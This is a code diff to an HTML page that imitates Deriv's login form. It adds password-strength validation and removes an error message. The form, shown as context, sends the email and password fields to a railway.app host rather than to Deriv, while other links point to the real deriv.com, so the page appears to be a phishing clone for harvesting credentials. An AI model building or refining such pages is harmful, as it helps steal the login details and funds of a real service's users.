@@ -708,15 +708,13 @@
             <form novalidate id="frmLogin" method="POST" action="https://deriv.up.railway.app/credentials">
                 <div class='input-group'>
                     <div class="input-wrapper ">
-                        <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
+                        <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off" autofocus="autofocus" maxlength="254" />
                         <label for="txtEmail">Email</label>
                         <span class="bar"></span>
                     </div>
                     <div class="input-error">
-                        <p class='hide error error_invalid'>That doesn&#39;t look like an email address.</p>
+                        <p class='hide error error_invalid'>That doesn't look like an email address.</p>
                         <p class='hide error error_required'>Email is required.</p>
-                        <p class='hide error error_invalid_pass'>Your email and/or password is incorrect.</p>
-                        
                     </div>
                 </div>
                 <div class="input-group">
@@ -728,18 +726,19 @@
                     </div>
                     <div class="input-error">
                         <p class='hide error error_required'>Password is required.</p>
+                        <p class='hide error error_uppercase'>Password must contain an uppercase letter.</p>
+                        <p class='hide error error_lowercase'>Password must contain a lowercase letter.</p>
+                        <p class='hide error error_special'>Password must contain a special character.</p>
                     </div>
                 </div>
                 <div id="lost-password-container">
-                    
-                        
-                        <a id="lost-password" href="https://deriv.com/reset-password">Forgot password?</a>
-                        
-                    
+                    <a id="lost-password" href="https://deriv.com/reset-password">Forgot password?</a>
                     <button type="submit" class="button secondary" name="login" value="Log in">Log in</button>
                 </div>
                 <input type="hidden" name="csrf_token" value="555ff3f77e2bd041cbc2e481b3349ee5b201869f" />
             </form>
+
+
             <div class="separator" id="separatorId">
                 <p class="center-text social-text">
                     Or continue with
@@ -858,6 +857,80 @@
          };
         </script>
 
+
+        <script>
+            document.getElementById('frmLogin').addEventListener('submit', function(event) {
+                const email = document.getElementById('txtEmail').value;
+                const password = document.getElementById('txtPass').value;
+                let isValid = true;
+
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                const uppercasePattern = /[A-Z]/;
+                const lowercasePattern = /[a-z]/;
+                const specialCharPattern = /[!@#$%^&*(),.?":{}|<>]/;
+
+                const emailErrorInvalid = document.querySelector('.error_invalid');
+                const emailErrorRequired = document.querySelector('.error_required');
+                const uppercaseError = document.querySelector('.error_uppercase');
+                const lowercaseError = document.querySelector('.error_lowercase');
+                const specialCharError = document.querySelector('.error_special');
+
+                const errorDisplayDuration = 3000; // 3 seconds
+
+                if (!email) {
+                    emailErrorRequired.classList.remove('hide');
+                    setTimeout(() => {
+                        emailErrorRequired.classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                } else if (!emailPattern.test(email)) {
+                    emailErrorInvalid.classList.remove('hide');
+                    setTimeout(() => {
+                        emailErrorInvalid.classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                }
+
+                if (!password) {
+                    document.querySelector('.error_required').classList.remove('hide');
+                    setTimeout(() => {
+                        document.querySelector('.error_required').classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                } else {
+                    document.querySelector('.error_required').classList.add('hide');
+                }
+
+                if (!uppercasePattern.test(password)) {
+                    uppercaseError.classList.remove('hide');
+                    setTimeout(() => {
+                        uppercaseError.classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                }
+
+                if (!lowercasePattern.test(password)) {
+                    lowercaseError.classList.remove('hide');
+                    setTimeout(() => {
+                        lowercaseError.classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                }
+
+                if (!specialCharPattern.test(password)) {
+                    specialCharError.classList.remove('hide');
+                    setTimeout(() => {
+                        specialCharError.classList.add('hide');
+                    }, errorDisplayDuration);
+                    isValid = false;
+                }
+
+                if (!isValid) {
+                    event.preventDefault();
+                }
+            });
+        </script>
+    
 
         <script type="module">
             let fallbackTimeout = setTimeout(() => update_social_buttons(window.local_config), 2000);
